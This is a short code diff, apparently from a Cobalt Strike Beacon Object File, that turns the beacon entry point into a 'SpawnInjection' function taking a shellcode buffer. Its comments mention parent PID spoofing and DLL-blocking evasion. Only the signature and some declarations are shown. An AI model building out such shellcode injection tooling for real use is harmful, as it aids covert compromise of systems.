@@ -9,11 +9,12 @@
 //  2. parent id (config ppid) - BeaconDataInt
 //  3. block dll policy (config blockdlls) - BeaconDataInt
 //
-extern "C" auto go( char* args, int argc ) -> void {
-    datap parser = { 0 };
-
-    BeaconDataParse( &parser, args, argc );
-
+auto SpawnInjection(     
+    _In_  INT64 ProcessObj,
+    _In_  PBYTE ShellcodeBuff,
+    _In_  ULONG ShellcodeSize,
+    _In_  PBYTE Argument 
+) -> void {
     NTSTATUS            status       = STATUS_SUCCESS; 
     PROCESS_INFORMATION process_info = { 0 };
     
